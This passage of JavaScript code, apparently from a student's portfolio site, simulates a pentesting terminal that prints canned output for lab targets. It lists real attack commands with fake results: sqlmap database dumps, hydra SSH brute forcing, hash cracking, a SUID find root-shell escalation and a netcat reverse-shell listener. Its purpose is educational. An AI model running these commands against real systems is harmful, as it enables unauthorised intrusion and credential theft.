                  <div>• <code class="text-warning font-bold">sqlmap -u "http://10.10.110.45/product.php?id=1" --dbs</code> : Enumerate backend databases.</div>
                  <div>• <code class="text-warning font-bold">sqlmap -u "http://10.10.110.45/product.php?id=1" -D users_production -T accounts --dump</code> : Extract user table rows.</div>
                </div>
              </div>
            `;
          }

          if (track === 'hydra' || track === 'passwords') {
            return `
              <div class="space-y-1.5 text-xs">
                <div class="text-primary font-bold">MODULE: AUTHENTICATION AUDITING &amp; HASH CRACKING</div>
                <div class="p-2.5 rounded bg-canvas-base border border-border-hairline space-y-1.5 text-[11px]">
                  <div>• <code class="text-primary font-bold">hydra -l admin -P wordlist.txt ssh://10.10.110.45</code> : Dictionary attack on SSH service.</div>
                  <div>• <code class="text-primary font-bold">hashcat -m 0 hashes.txt rockyou.txt</code> : GPU MD5 hash recovery.</div>
                  <div>• <code class="text-primary font-bold">john --wordlist=wordlist.txt hashes.txt</code> : John the Ripper hash cracking.</div>
                  <div>• <code class="text-primary font-bold">john --show hashes.txt</code> : Display cracked cleartext credentials.</div>
                </div>
              </div>
            `;
          }

          if (track === 'privesc') {
            return `
              <div class="space-y-1.5 text-xs">
                <div class="text-secondary font-bold">MODULE: LINUX PRIVILEGE ESCALATION</div>
                <div class="p-2.5 rounded bg-canvas-base border border-border-hairline space-y-1.5 text-[11px]">
                  <div>• <code class="text-secondary font-bold">find . -exec /bin/sh -p \\; -quit</code> : Exploit SUID on /usr/bin/find to drop into root shell.</div>
                  <div>• <code class="text-secondary font-bold">sudo -l</code> : Identify commands with NOPASSWD root permissions.</div>
                  <div>• <code class="text-secondary font-bold">uname -a</code> : Fingerprint kernel release for known kernel exploits.</div>
                </div>
              </div>
            `;
          }

          if (track === 'metasploit') {
            return `
              <div class="space-y-1.5 text-xs">
                <div class="text-danger-critical font-bold">MODULE: METASPLOIT &amp; EXPLOITATION FRAMEWORK</div>
                <div class="p-2.5 rounded bg-canvas-base border border-border-hairline space-y-1.5 text-[11px]">
                  <div>• <code class="text-danger-critical font-bold">msfconsole</code> : Launch Metasploit Framework interactive console.</div>
                  <div>• <code class="text-danger-critical font-bold">searchsploit vsftpd 2.3.4</code> : Query offline Exploit-DB for known vulnerabilities.</div>
                  <div>• <code class="text-danger-critical font-bold">nc -lvnp 4444</code> : Catch incoming reverse shell on port 4444.</div>
                  <div>• <code class="text-danger-critical font-bold">nc 10.10.110.45 21</code> : Perform manual service banner grab on port 21.</div>
                </div>
              </div>
            `;
          }

          return `<div class="text-warning">Unknown track '${escapeHtml(track)}'. Type <span class="text-primary font-bold">learn</span> to see all tracks.</div>`;
        }

        case 'cheatsheet': {
          const tool = arg1.toLowerCase();
          if (tool === 'nmap') {
            return `
              <div class="p-2.5 rounded bg-canvas-base border border-border-hairline space-y-1 text-xs">
                <div class="text-primary font-bold">NMAP RAPID REFERENCE:</div>
                <div class="font-mono text-[11px] space-y-0.5">
                  <div><span class="text-secondary font-bold">-sS</span> : SYN Stealth Scan (half-open, root req)</div>
                  <div><span class="text-secondary font-bold">-sT</span> : Full TCP Connect Scan (non-root)</div>
                  <div><span class="text-secondary font-bold">-sV</span> : Probe open ports to determine service/version</div>
                  <div><span class="text-secondary font-bold">-sC</span> : Run default safe Lua scripts</div>
                  <div><span class="text-secondary font-bold">-p-</span> : Scan all 65,535 TCP ports</div>
                  <div><span class="text-secondary font-bold">-p 22,80,443</span> : Scan specific comma-separated ports</div>
                  <div><span class="text-secondary font-bold">-A</span>  : Aggressive: OS detect, version, scripts &amp; traceroute</div>
                  <div><span class="text-secondary font-bold">-T4</span> : Faster timing template for reliable networks</div>
                  <div><span class="text-secondary font-bold">-oN scan.log</span> : Save output to human-readable file</div>
                </div>
              </div>
            `;
          }
          if (tool === 'linux') {
            return `
              <div class="p-2.5 rounded bg-canvas-base border border-border-hairline space-y-1 text-xs">
                <div class="text-primary font-bold">LINUX SYSTEM AUDITING REFERENCE:</div>
                <div class="font-mono text-[11px] space-y-0.5">
                  <div><span class="text-primary font-bold">ls -la</span> : List all files with permissions &amp; hidden files</div>
                  <div><span class="text-primary font-bold">cat /etc/passwd</span> : Display user list and default shells</div>
                  <div><span class="text-primary font-bold">find / -perm -4000 2>/dev/null</span> : Find root SUID binaries</div>
                  <div><span class="text-primary font-bold">sudo -l</span> : Check current user's passwordless privileges</div>
                  <div><span class="text-primary font-bold">ps aux</span> : View all running processes with user attribution</div>
                  <div><span class="text-primary font-bold">netstat -tuln / ss -tuln</span> : Show open listening ports</div>
                  <div><span class="text-primary font-bold">chmod +x script.sh</span> : Add execute permission</div>
                </div>
              </div>
            `;
          }
          if (tool === 'hydra') {
            return `
              <div class="p-2.5 rounded bg-canvas-base border border-border-hairline space-y-1 text-xs">
                <div class="text-warning font-bold">HYDRA LOGIN CRACKING REFERENCE:</div>
                <div class="font-mono text-[11px] space-y-0.5">
                  <div><span class="text-warning font-bold">hydra -l &lt;user&gt; -P &lt;wordlist&gt; ssh://&lt;ip&gt;</span> : Attack SSH</div>
                  <div><span class="text-warning font-bold">hydra -L &lt;users&gt; -P &lt;wordlist&gt; ftp://&lt;ip&gt;</span> : Attack FTP with user list</div>
                  <div><span class="text-warning font-bold">hydra -l admin -P &lt;wordlist&gt; &lt;ip&gt; http-post-form "/login:user=^USER^&amp;pass=^PASS^:F=invalid"</span></div>
                  <div><span class="text-warning font-bold">-t 16</span> : Set concurrent parallel connections (threads)</div>
                </div>
              </div>
            `;
          }
          return `
            <div class="text-outline my-1 text-xs">
              Usage: <span class="text-primary font-bold">cheatsheet &lt;tool&gt;</span><br/>
              Available cheatsheets: <span class="text-secondary">nmap</span>, <span class="text-primary">linux</span>, <span class="text-warning">hydra</span>.
            </div>
          `;
        }

        case 'targets': {
          return `
            <div class="p-3 rounded bg-canvas-base border border-secondary/40 space-y-2 text-xs">
              <div class="text-secondary font-bold flex items-center gap-1.5">
                <span class="material-symbols-outlined text-sm">gps_fixed</span>
                <span>SCOPED LAB ENVIRONMENT TARGETS:</span>
              </div>
              <div class="space-y-1.5 text-[11px]">
                <div class="p-2 rounded bg-surface-raised border border-border-hairline">
                  <div class="text-on-surface font-bold">Target 1: 10.10.110.45 (starlight-web.lab)</div>
                  <div class="text-outline">OS: Ubuntu Linux 22.04 LTS · Educational Practice Server</div>
                  <div class="text-primary">Open Ports: 21 (vsftpd 2.3.4), 22 (SSH), 80 (Apache), 445 (Samba), 3306 (MySQL)</div>
                  <div class="text-secondary">Vectors: Anonymous FTP, /admin web portal, SQLi on product.php, SUID find</div>
                </div>
                <div class="p-2 rounded bg-surface-raised border border-border-hairline">
                  <div class="text-on-surface font-bold">Target 2: 10.10.10.150 (corp-ad.lab)</div>
                  <div class="text-outline">OS: Windows Server 2022 · Domain Controller Simulation</div>
                  <div class="text-warning">Open Ports: 53 (DNS), 88 (Kerberos), 135 (MSRPC), 389 (LDAP), 445 (SMB)</div>
                </div>
                <div class="p-2 rounded bg-surface-raised border border-border-hairline">
                  <div class="text-on-surface font-bold">Target 3: 127.0.0.1 (sec-station-local)</div>
                  <div class="text-outline">OS: Kali Linux 6.8 · Local Security Research Node</div>
                  <div class="text-primary">Open Ports: 22 (SSH), 80 (HTTP), 443 (HTTPS), 8000 (ChromaDB), 11434 (Ollama)</div>
                </div>
              </div>
              <div class="text-outline text-[10px]">Tip: Run <code class="text-primary font-bold">nmap -sS -sV 10.10.110.45</code> to initiate discovery!</div>
            </div>
          `;
        }

        // =====================================================================
        // LINUX CORE SYSTEM COMMANDS
        // =====================================================================
        case 'ls':
        case 'dir': {
          const isLong = fullArgs.includes('-l');
          const isAll = fullArgs.includes('-a');
          const files = VIRTUAL_FS[currentWorkingDir] || {};

          if (isLong) {
            return `
              <div class="font-mono text-[11px] whitespace-pre text-on-surface leading-tight">
total 40
drwxr-xr-x 2 guest guest  4096 Oct 04 00:15 .
drwxr-xr-x 4 guest guest  4096 Oct 04 00:01 ..
-rwxr-xr-x 1 guest guest   412 Oct 04 00:12 <span class="text-primary font-bold">recon.sh</span>
-rw-r--r-- 1 guest guest   284 Oct 04 00:10 <span class="text-on-surface">targets.txt</span>
-rw-r--r-- 1 guest guest   390 Oct 04 00:14 <span class="text-on-surface">notes.txt</span>
-rw------- 1 guest guest  1823 Oct 04 00:08 <span class="text-warning">id_rsa</span>
-rw-r--r-- 1 guest guest   195 Oct 04 00:09 <span class="text-on-surface">hashes.txt</span>
-rw-r--r-- 1 guest guest    98 Oct 04 00:05 <span class="text-on-surface">wordlist.txt</span>
-rw-r--r-- 1 guest guest  1420 Oct 04 00:16 <span class="text-secondary">scan.log</span>
              </div>
            `;
          }

          return `
            <div class="font-mono text-xs flex flex-wrap gap-4 text-on-surface">
              <span class="text-primary font-bold">recon.sh*</span>
              <span>targets.txt</span>
              <span>notes.txt</span>
              <span class="text-warning">id_rsa</span>
              <span>hashes.txt</span>
              <span>wordlist.txt</span>
              <span class="text-secondary">scan.log</span>
            </div>
          `;
        }

        case 'pwd':
          return `<div class="text-on-surface font-mono">${currentWorkingDir}</div>`;

        case 'cd': {
          const target = arg1.trim();
          if (!target || target === '~' || target === '/home/guest/lab') {
            currentWorkingDir = '/home/guest/lab';
          } else if (target === '..' || target === '/home/guest') {
            currentWorkingDir = '/home/guest';
          } else if (target === '/etc') {
            currentWorkingDir = '/etc';
          } else if (target === '/') {
            currentWorkingDir = '/';
          } else {
            return `<div class="text-warning font-mono">cd: no such file or directory: ${escapeHtml(target)}</div>`;
          }
          return `<div class="text-outline text-[11px]">Changed directory to ${currentWorkingDir}</div>`;
        }

        case 'cat': {
          const filename = arg1.trim();
          if (!filename) {
            return `<div class="text-warning font-mono">Usage: cat &lt;filename&gt; (e.g. cat targets.txt, cat notes.txt, cat /etc/passwd)</div>`;
          }

          if (filename === 'resume' || filename === 'cv') {
            return `
              <div class="p-2.5 rounded bg-canvas-base border border-border-hairline space-y-1 text-[11px]">
                <div class="text-primary font-bold">RESUME · MIHRAJ MASHOOR K</div>
                <div>Role: Offensive Security Student &amp; Security Automation Researcher</div>
                <div>Education: B.Tech Computer Science &amp; Cybersecurity (CGPA 7.9)</div>
                <div>Downloadable PDF: <a href="${root}CV_2026_UPDATED.pdf" target="_blank" class="text-secondary underline font-bold">CV_2026_UPDATED.pdf ↗</a></div>
                <div>Interactive Version: <a href="${root}resume.html" class="text-primary underline font-bold">Open Browser Resume ↗</a></div>
              </div>
            `;
          }

          if (filename === '/etc/shadow') {
            return `<div class="text-danger-critical font-mono">cat: /etc/shadow: Permission denied (Superuser / root access required)</div>`;
          }

          if (filename === '/etc/passwd') {
            return `<div class="font-mono text-[11px] bg-canvas-base p-2.5 rounded border border-border-hairline whitespace-pre text-on-surface">${escapeHtml(VIRTUAL_FS['/etc']['passwd'])}</div>`;
          }

          if (filename === '/etc/os-release') {
            return `<div class="font-mono text-[11px] bg-canvas-base p-2.5 rounded border border-border-hairline whitespace-pre text-on-surface">${escapeHtml(VIRTUAL_FS['/etc']['os-release'])}</div>`;
          }

          const localFiles = VIRTUAL_FS['/home/guest/lab'];
          if (localFiles && localFiles[filename]) {
            return `<div class="font-mono text-[11px] bg-canvas-base p-2.5 rounded border border-border-hairline whitespace-pre text-on-surface">${escapeHtml(localFiles[filename])}</div>`;
          }

          return `<div class="text-danger-critical font-mono">cat: ${escapeHtml(filename)}: No such file or directory</div>`;
        }

        case 'grep': {
          if (!arg1) return `<div class="text-warning font-mono">Usage: grep &lt;pattern&gt; &lt;file&gt;</div>`;
          const keyword = arg1.replace(/['"]/g, '').toLowerCase();
          const filename = arg2 || 'notes.txt';
          const content = VIRTUAL_FS['/home/guest/lab'][filename] || VIRTUAL_FS['/etc'][filename] || '';

          if (!content) {
            return `<div class="text-danger-critical font-mono">grep: ${escapeHtml(filename)}: No such file or directory</div>`;
          }

          const matchedLines = content.split('\n').filter(line => line.toLowerCase().includes(keyword));
          if (!matchedLines.length) {
            return `<div class="text-outline text-xs">No matching lines found for '${escapeHtml(keyword)}' in ${escapeHtml(filename)}.</div>`;
          }

          return `
            <div class="font-mono text-[11px] bg-canvas-base p-2 rounded border border-border-hairline space-y-1">
              ${matchedLines.map(line => `<div>${escapeHtml(line).replace(new RegExp(`(${keyword})`, 'gi'), '<span class="text-primary font-bold bg-primary/20 px-0.5 rounded">$1</span>')}</div>`).join('')}
            </div>
          `;
        }

        case 'find': {
          if (fullArgs.includes('-perm') || fullArgs.includes('4000')) {
            return `
              <div class="font-mono text-[11px] bg-canvas-base p-2.5 rounded border border-border-hairline space-y-0.5 text-on-surface">
                <div class="text-outline font-bold">HUNTING SUID BINARIES (-perm -4000):</div>
                <div>/usr/bin/passwd</div>
                <div>/usr/bin/sudo</div>
                <div>/usr/bin/chsh</div>
                <div>/usr/bin/newgrp</div>
                <div>/usr/bin/gpasswd</div>
                <div class="text-warning font-bold">/usr/bin/find  &lt;-- [POTENTIAL MISCONFIGURATION: SUID bit enabled!]</div>
                <div>/usr/bin/umount</div>
                <div>/bin/ping</div>
                <div>/bin/mount</div>
                <div class="text-outline text-[10px] mt-1">Exploit vector: Try executing: <code class="text-primary font-bold">find . -exec /bin/sh -p \\; -quit</code></div>
              </div>
            `;
          }

          return `
            <div class="font-mono text-[11px] space-y-0.5 text-on-surface">
              <div>./recon.sh</div>
              <div>./targets.txt</div>
              <div>./notes.txt</div>
              <div>./id_rsa</div>
              <div>./hashes.txt</div>
              <div>./wordlist.txt</div>
              <div>./scan.log</div>
            </div>
          `;
        }

        case 'chmod':
          return `<div class="text-primary font-mono text-xs">Permissions updated: -rwxr-xr-x 1 guest guest ${escapeHtml(arg2 || arg1)}</div>`;

        case 'ps':
          return `
            <div class="font-mono text-[11px] whitespace-pre text-on-surface bg-canvas-base p-2 rounded border border-border-hairline leading-tight">
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1 168344 11244 ?        Ss   00:00   0:02 /sbin/init
root       412  0.0  0.1  15892  7420 ?        Ss   00:00   0:00 /usr/sbin/sshd -D
guest     1024  0.1  0.8 198420 32410 pts/0    Ss   00:01   0:01 /bin/bash
guest     1420  1.2  4.2 892400 134200 pts/0   Sl   00:05   0:14 /usr/bin/ollama serve
guest     1844  0.0  0.1  18900  3210 pts/0    R+   00:15   0:00 ps aux
            </div>
          `;

        case 'uname':
          return `<div class="font-mono text-xs text-on-surface">Linux sec-station 6.8.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.12-1kali1 (2026-08-30) x86_64 GNU/Linux</div>`;

        case 'ifconfig':
        case 'ip':
          return `
            <div class="font-mono text-[11px] whitespace-pre text-on-surface bg-canvas-base p-2.5 rounded border border-border-hairline leading-tight">
<span class="text-primary font-bold">eth0</span>: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet <span class="text-secondary font-bold">192.168.1.142</span>  netmask 255.255.255.0  broadcast 192.168.1.255
        ether 00:0c:29:84:a1:fe  txqueuelen 1000  (Ethernet)

<span class="text-primary font-bold">tun0</span>: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt;  mtu 1500
        inet <span class="text-primary font-bold">10.10.14.23</span>  netmask 255.255.254.0  destination 10.10.14.23 (TryHackMe Lab VPN)

<span class="text-outline font-bold">lo</span>: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
            </div>
          `;

        case 'df':
          return `
            <div class="font-mono text-[11px] whitespace-pre text-on-surface bg-canvas-base p-2 rounded border border-border-hairline leading-tight">
Filesystem      Size  Used Avail Use% Mounted on
/dev/nvme0n1p2  931G  384G  500G  44% /
udev             16G     0   16G   0% /dev
tmpfs           3.2G  2.1M  3.2G   1% /run
            </div>
          `;

        case 'free':
          return `
            <div class="font-mono text-[11px] whitespace-pre text-on-surface bg-canvas-base p-2 rounded border border-border-hairline leading-tight">
               total        used        free      shared  buff/cache   available
Mem:        32140Mi     14210Mi     15240Mi       120Mi      2690Mi     17410Mi
Swap:        8192Mi       410Mi      7782Mi
            </div>
          `;

        case 'history':
          return `
            <div class="font-mono text-[11px] space-y-0.5 text-on-surface-variant">
              <div>  1  sudo openvpn mihraj_thm.ovpn &amp;</div>
              <div>  2  ip addr show tun0</div>
              <div>  3  nmap -sS -sV -sC -T4 10.10.110.45 -oN initial_scan.log</div>
              <div>  4  gobuster dir -u http://10.10.110.45 -w /usr/share/wordlists/dirb/common.txt</div>
              <div>  5  hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.110.45</div>
              <div>  6  searchsploit vsftpd 2.3.4</div>
              <div>  7  nc -lvnp 4444</div>
            </div>
          `;

        case 'sudo': {
          if (fullArgs.includes('-l')) {
            return `
              <div class="font-mono text-[11px] bg-canvas-base p-2.5 rounded border border-border-hairline space-y-1 text-on-surface">
                <div>Matching Defaults entries for guest on sec-station:</div>
                <div class="text-outline pl-2">env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin</div>
                <div class="mt-2 text-primary font-bold">User guest may run the following commands on sec-station:</div>
                <div class="text-secondary pl-2 font-bold">(ALL : ALL) NOPASSWD: /usr/bin/nmap, /usr/bin/python3, /usr/bin/find</div>
              </div>
            `;
          }

          if (fullArgs.includes('find') && fullArgs.includes('-exec')) {
            return `
              <div class="p-2.5 rounded bg-canvas-base border border-primary/50 text-xs space-y-1">
                <div class="text-primary font-bold"># ROOT SHELL SPAWNED (EUID=0)</div>
                <div class="text-on-surface">root@sec-station:~# whoami</div>
                <div class="text-primary font-bold">root (uid=0 gid=0 groups=0(root))</div>
                <div class="text-outline text-[10px]">Privilege escalation successful via SUID / sudo find execution vector!</div>
              </div>
            `;
          }

          return `<div class="text-danger-critical font-mono">guest is not in the default sudoers file without explicit grants. Run 'sudo -l' to check permitted binaries.</div>`;
        }

        // =====================================================================
        // SECURITY & RECONNAISSANCE TOOLS
        // =====================================================================
        case 'nmap':
        case 'scan': {
          const target = parts.find(p => p.includes('.') || p.includes('localhost')) || '10.10.110.45';
          const isVuln = fullArgs.includes('--script vuln') || fullArgs.includes('vuln');
          const isFull = fullArgs.includes('-p-');

          if (isVuln) {
            return `
              <div class="p-2.5 rounded bg-canvas-base border border-danger-critical/40 space-y-1 text-xs font-mono">
                <div class="text-primary font-bold">Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-04 00:18 UTC</div>
                <div class="text-outline">Nmap scan report for ${escapeHtml(target)}</div>
                <div class="text-outline">Host is up (0.021s latency).</div>
                <div class="mt-2 text-on-surface whitespace-pre text-[11px] leading-relaxed">
PORT     STATE SERVICE VERSION
<span class="text-danger-critical font-bold">21/tcp   open  ftp     vsftpd 2.3.4</span>
| <span class="text-danger-critical font-bold">ftp-vsftpd-backdoor:</span> 
|   <span class="text-danger-critical font-bold">VULNERABLE:</span> vsftpd version 2.3.4 backdoor
|   <span class="text-outline">State: VULNERABLE (Exploitable)</span>
|   <span class="text-outline">IDs:  CVE:CVE-2011-2523  OSVDB:73573</span>
|_  <span class="text-on-surface">Description: vsftpd 2.3.4 contains a backdoor smiley ':)' triggering shell on port 6200.</span>

<span class="text-warning font-bold">80/tcp   open  http    Apache httpd 2.4.52</span>
| <span class="text-warning font-bold">http-vuln-cve2021-41773:</span>
|   <span class="text-outline">Path Traversal &amp; Remote Code Execution in Apache 2.4.49/2.4.50</span>
                </div>
                <div class="text-outline text-[10px] mt-2">Nmap done: 1 IP address scanned in 3.42 seconds</div>
              </div>
            `;
          }

          if (isFull) {
            return `
              <div class="p-2.5 rounded bg-canvas-base border border-secondary/40 space-y-1 text-xs font-mono">
                <div class="text-primary font-bold">Starting Nmap 7.94 -- 65535 Port Full Sweep</div>
                <div class="text-outline">Nmap scan report for ${escapeHtml(target)}</div>
                <div class="text-outline">Not shown: 65530 closed tcp ports (reset)</div>
                <div class="mt-2 text-on-surface whitespace-pre text-[11px]">
PORT      STATE SERVICE
<span class="text-primary font-bold">21/tcp    open</span>  ftp
<span class="text-primary font-bold">22/tcp    open</span>  ssh
<span class="text-primary font-bold">80/tcp    open</span>  http
<span class="text-primary font-bold">445/tcp   open</span>  microsoft-ds
<span class="text-secondary font-bold">3306/tcp  open</span>  mysql
                </div>
                <div class="text-outline text-[10px] mt-2">Nmap done: 65535 ports scanned in 12.80 seconds</div>
              </div>
            `;
          }

          return `
            <div class="p-2.5 rounded bg-canvas-base border border-border-hairline space-y-1 text-xs font-mono">
              <div class="text-primary font-bold">Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-04 00:19 UTC</div>
              <div class="text-outline">Nmap scan report for ${escapeHtml(target)} (starlight-web.lab)</div>
              <div class="text-outline">Host is up (0.018s latency). Scanned at rate 1000 pkts/s.</div>
              <div class="mt-2 text-on-surface whitespace-pre text-[11px] leading-tight">
<span class="text-outline">PORT     STATE SERVICE     VERSION</span>
<span class="text-primary font-bold">21/tcp   open</span>  ftp         vsftpd 2.3.4
| <span class="text-secondary">ftp-anon:</span> Anonymous FTP login allowed (FTP code 230)
<span class="text-primary font-bold">22/tcp   open</span>  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
<span class="text-primary font-bold">80/tcp   open</span>  http        Apache httpd 2.4.52 ((Ubuntu))
|_<span class="text-secondary">http-title:</span> Starlight Portal - Authorized Login Only
<span class="text-primary font-bold">445/tcp  open</span>  netbios-ssn Samba smbd 4.15.5
<span class="text-secondary font-bold">3306/tcp open</span>  mysql       MySQL 8.0.35
              </div>
              <div class="text-outline text-[11px] mt-2">
                Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br/>
                Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds
              </div>
            </div>
          `;
        }

        case 'gobuster': {
          return `
            <div class="p-2.5 rounded bg-canvas-base border border-warning/40 space-y-1 text-xs font-mono">
              <div class="text-warning font-bold">Gobuster v3.6 - Directory Brute-Force Simulation</div>
              <div class="text-outline">[+] Url:         http://10.10.110.45/</div>
              <div class="text-outline">[+] Method:      GET</div>
              <div class="text-outline">[+] Threads:     10</div>
              <div class="text-outline">[+] Wordlist:    wordlist.txt</div>
              <div class="mt-2 space-y-1 text-[11px]">
                <div class="text-primary font-bold">[+] /admin               (Status: 301) [Size: 178] [--&gt; http://10.10.110.45/admin/]</div>
                <div class="text-primary font-bold">[+] /login               (Status: 200) [Size: 2450]</div>
                <div class="text-on-surface font-bold">[+] /uploads             (Status: 200) [Size: 412] [Directory Index]</div>
                <div class="text-danger-critical font-bold">[+] /api                 (Status: 403) [Size: 280]</div>
                <div class="text-primary font-bold">[+] /config              (Status: 301) [Size: 182]</div>
                <div class="text-on-surface font-bold">[+] /robots.txt          (Status: 200) [Size: 64]</div>
              </div>
              <div class="text-outline text-[10px] mt-2">Progress: 10 / 10 words (100.00%) · Finished directory sweep.</div>
            </div>
          `;
        }

        case 'ffuf': {
          return `
            <div class="p-2.5 rounded bg-canvas-base border border-warning/40 space-y-1 text-xs font-mono">
              <div class="text-warning font-bold">ffuf - Fast Web Fuzzer v2.1.0</div>
              <div class="text-outline">:: Method: GET | URL: http://10.10.110.45/FUZZ | Wordlist: wordlist.txt ::</div>
              <div class="mt-2 space-y-0.5 text-[11px]">
                <div><span class="text-primary font-bold">[Status: 200, Size: 2450, Words: 182]</span>   /login</div>
                <div><span class="text-primary font-bold">[Status: 301, Size: 178, Words: 12]</span>    /admin</div>
                <div><span class="text-on-surface font-bold">[Status: 200, Size: 412, Words: 24]</span>    /uploads</div>
                <div><span class="text-danger-critical font-bold">[Status: 403, Size: 280, Words: 18]</span>    /api</div>
              </div>
            </div>
          `;
        }

        case 'hydra': {
          return `
            <div class="p-2.5 rounded bg-canvas-base border border-primary/50 space-y-1 text-xs font-mono">
              <div class="text-primary font-bold">Hydra v9.5 (c) 2026 by van Hauser / THC - Network Login Cracker</div>
              <div class="text-outline">[DATA] attacking ssh://10.10.110.45:22/</div>
              <div class="text-outline">[DATA] 1 target, 1 login, 10 passwords in wordlist, 16 tasks</div>
              <div class="mt-2 p-2 rounded bg-surface-raised border border-primary/40 text-on-surface text-[11px] space-y-1">
                <div class="text-outline">[ATTEMPT] testing admin : password ... [failed]</div>
                <div class="text-outline">[ATTEMPT] testing admin : 123456 ... [failed]</div>
                <div class="text-primary font-bold flex items-center gap-1.5">
                  <span class="material-symbols-outlined text-sm">check_circle</span>
                  <span>[22][ssh] host: 10.10.110.45   login: admin   password: Password123</span>
                </div>
              </div>
              <div class="text-primary font-bold text-[11px] mt-1">1 of 1 target completed, 1 valid password found!</div>
            </div>
          `;
        }

        case 'hashcat': {
          return `
            <div class="p-2.5 rounded bg-canvas-base border border-warning/50 space-y-1 text-xs font-mono">
              <div class="text-warning font-bold">hashcat (v6.2.6) starting in dictionary attack mode (MD5: -m 0)...</div>
              <div class="text-outline">Device #1: NVIDIA GeForce RTX 4070 Laptop GPU (8192 MB)</div>
              <div class="mt-2 text-on-surface text-[11px] space-y-1">
                <div>e10adc3949ba59abbe56e057f20f883e:<span class="text-primary font-bold">123456</span></div>
                <div>098f6bcd4621d373cade4e832627b4f6:<span class="text-primary font-bold">test</span></div>
              </div>
              <div class="text-outline text-[10px] mt-2">
                Session..........: hashcat<br/>
                Status...........: Cracked (100.00%)<br/>
                Speed.Dev.#1.....: 8,421.4 MH/s (0.01ms)
              </div>
            </div>
          `;
        }

        case 'john': {
          if (fullArgs.includes('--show')) {
            return `
              <div class="font-mono text-xs bg-canvas-base p-2 rounded border border-border-hairline space-y-1">
                <div>admin:<span class="text-primary font-bold">123456</span></div>
                <div>analyst:<span class="text-primary font-bold">test</span></div>
                <div class="text-outline text-[10px] mt-1">2 password hashes cracked, 1 left.</div>
              </div>
            `;
          }

          return `
            <div class="p-2.5 rounded bg-canvas-base border border-warning/50 space-y-1 text-xs font-mono">
              <div class="text-warning font-bold">Loaded 3 password hashes with 3 different salts (Raw-MD5 / SHA256)</div>
              <div class="text-on-surface text-[11px] mt-1">
                <span class="text-primary font-bold">123456</span>           (admin)<br/>
                <span class="text-primary font-bold">test</span>             (analyst)
              </div>
              <div class="text-outline text-[10px] mt-1">Session completed. Run 'john --show hashes.txt' to view.</div>
            </div>
          `;
        }

        case 'sqlmap': {
          if (fullArgs.includes('--dump')) {
            return `
              <div class="p-2.5 rounded bg-canvas-base border border-warning/50 space-y-1 text-xs font-mono">
                <div class="text-warning font-bold">sqlmap/1.8#stable - Database Table Dump: users_production.accounts</div>
                <div class="mt-2 font-mono text-[11px] whitespace-pre text-on-surface bg-surface-raised p-2 rounded border border-border-hairline">
+----+----------+----------------------------------+---------------------+
| id | username | password_hash                    | email               |
+----+----------+----------------------------------+---------------------+
| 1  | admin    | e10adc3949ba59abbe56e057f20f883e | admin@starlight.lab |
| 2  | analyst  | 098f6bcd4621d373cade4e832627b4f6 | sec@starlight.lab   |
+----+----------+----------------------------------+---------------------+
                </div>
                <div class="text-primary font-bold text-[11px] mt-1">[INFO] Fetched 2 entries from target database table.</div>
              </div>
            `;
          }

          return `
            <div class="p-2.5 rounded bg-canvas-base border border-warning/50 space-y-1 text-xs font-mono">
              <div class="text-warning font-bold">sqlmap/1.8#stable - Automated SQL Injection Assessment</div>
              <div class="text-outline">GET parameter 'id' is vulnerable. Do you want to keep testing the others? [y/N] N</div>
              <div class="text-on-surface text-[11px] mt-1">
                sqlmap identified the following injection points:<br/>
                • Type: boolean-based blind / AND boolean-based blind - WHERE or HAVING clause<br/>
                • Type: UNION query / 3 columns
              </div>
              <div class="mt-2 text-primary font-bold text-[11px]">
                Available Databases (DBMS: MySQL &gt;= 8.0):<br/>
                [*] information_schema<br/>
                [*] starlight_portal<br/>
                [*] users_production
              </div>
            </div>
          `;
        }

        case 'nc':
        case 'netcat': {
          if (fullArgs.includes('-l') || fullArgs.includes('-lvnp')) {
            return `
              <div class="p-2.5 rounded bg-canvas-base border border-primary/50 space-y-1 text-xs font-mono">
                <div class="text-outline">listening on [any] 4444 ...</div>
                <div class="text-primary font-bold flex items-center gap-1.5 my-1">
                  <span class="material-symbols-outlined text-sm">link</span>
                  <span>connect to [10.10.14.23] from (UNKNOWN) [10.10.110.45] 52410</span>
                </div>
                <div class="p-2 rounded bg-surface-raised border border-border-hairline text-[11px] space-y-1">
                  <div class="text-outline">Linux starlight-web.lab 5.15.0-89-generic #99-Ubuntu SMP x86_64</div>
                  <div class="text-on-surface"><span class="text-primary font-bold">www-data@starlight-web:/var/www/html$</span> whoami</div>
                  <div class="text-secondary font-bold">www-data (uid=33 gid=33)</div>
                </div>
                <div class="text-outline text-[10px]">Reverse shell interactive connection established!</div>
              </div>
            `;
          }

          return `
            <div class="p-2 rounded bg-canvas-base border border-border-hairline text-xs font-mono space-y-1">
              <div class="text-outline">Connecting to ${escapeHtml(arg1)} on port ${escapeHtml(arg2 || '21')}...</div>
              <div class="text-primary font-bold">220 (vsFTPd 2.3.4)</div>
            </div>
          `;
        }

        case 'searchsploit': {
          const query = fullArgs || 'vsftpd';
          return `
            <div class="p-2.5 rounded bg-canvas-base border border-danger-critical/40 space-y-1 text-xs font-mono">
              <div class="text-danger-critical font-bold">Exploit Title matching '${escapeHtml(query)}':</div>
              <div class="mt-2 font-mono text-[11px] whitespace-pre text-on-surface leading-tight">
---------------------------------------------------+---------------------------------
 Exploit Title                                     |  Path
---------------------------------------------------+---------------------------------
 vsftpd 2.3.4 - Backdoor Command Execution         | unix/remote/49757.py
 vsftpd 2.3.4 - Backdoor Command Execution (MSF)   | unix/remote/17491.rb
 Apache 2.4.49/2.4.50 - Path Traversal &amp; RCE       | multiple/remote/50383.sh
 Linux Kernel 5.8 &lt; 5.16.11 - 'PwnKit' Local PrivEsc | linux/local/50689.c
